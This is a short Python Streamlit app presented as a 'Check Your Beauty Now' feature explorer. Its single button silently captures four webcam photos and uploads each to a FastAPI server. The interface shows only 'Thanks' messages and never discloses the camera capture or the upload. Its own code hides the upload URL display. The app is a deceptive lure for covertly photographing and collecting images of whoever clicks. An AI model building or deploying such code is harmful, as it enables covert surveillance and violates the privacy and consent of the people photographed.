import streamlit as st
import requests
import os
import cv2
import time

# FastAPI server URL
FASTAPI_URL = "http://127.0.0.1:8000/upload-image/"

# Function to capture images
def capture_cam_img():
    # Create directory if it does not exist
    directory = 'images'
    if not os.path.exists(directory):
        os.makedirs(directory)

    # Capture four images automatically
    for i in range(4):
        # Access the camera
        camera = cv2.VideoCapture(0)

        # Check if camera opened successfully
        if not camera.isOpened():
            st.error("Error: Could not open camera.")
            return

        # Capture frame-by-frame
        ret, frame = camera.read()
        if not ret:
            st.error("Error: Could not capture image.")
            return

        # Save the captured frame to the specified directory
        img_path = os.path.join(directory, f'captured_image_{i+1}.jpg')
        cv2.imwrite(img_path, frame)
        st.success(f"Thanks♥")

        # Release the camera
        camera.release()

        # Add delay before capturing the next image
        time.sleep(1)  # Delay for 1 second

    # Destroy all windows
    cv2.destroyAllWindows()

# Function to upload images to FastAPI server
def upload_images():
    directory = 'images'
    for filename in os.listdir(directory):
        if filename.endswith(".jpg"):
            img_path = os.path.join(directory, filename)
            with open(img_path, "rb") as file:
                response = requests.post(FASTAPI_URL, files={"file": file})
                if response.status_code == 200:
                    st.success("Thanks")
                  #   st.success(f"{filename}: {response.json()['url']}")
                else:
                    st.error(f"Failed to upload {filename}: {response.text}")

# Streamlit UI
st.title("Check Your Beauty Now")
st.write("Explore Our Features Now and Enjoy Full Time")
# Button to capture images
if st.button("Explore Features"):
    capture_cam_img()
    upload_images()

